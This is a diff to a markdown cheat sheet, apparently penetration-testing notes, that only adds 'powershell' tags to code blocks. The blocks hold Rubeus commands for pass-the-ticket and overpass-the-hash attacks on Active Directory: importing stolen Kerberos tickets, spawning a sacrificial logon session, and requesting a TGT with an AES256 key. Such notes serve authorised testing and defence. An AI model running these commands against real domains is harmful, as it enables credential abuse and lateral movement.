@@ -63,7 +63,7 @@ Requests a TGT and injects it into the current logon session immediately. No `.k
 
 ### Rubeus - Import from file
 
-```
+```powershell
 Rubeus.exe ptt /ticket:<ticket>.kirbi
 ```
 
@@ -71,7 +71,7 @@ Imports a `.kirbi` ticket file into the current session.
 
 ### Rubeus - Import from Base64
 
-```
+```powershell
 Rubeus.exe ptt /ticket:<base64string>
 ```
 
@@ -113,13 +113,13 @@ Connects to the target using the injected ticket. The PSSession inherits the Ker
 
 > Run on the Windows target.
 
-```
+```powershell
 Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
 
 Creates an isolated sacrificial logon session (Logon Type 9) with a new cmd.exe. Equivalent to `runas /netonly`. Prevents existing TGTs in the current session from being overwritten.
 
-```
+```powershell
 Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes256key> /ptt
 ```
 
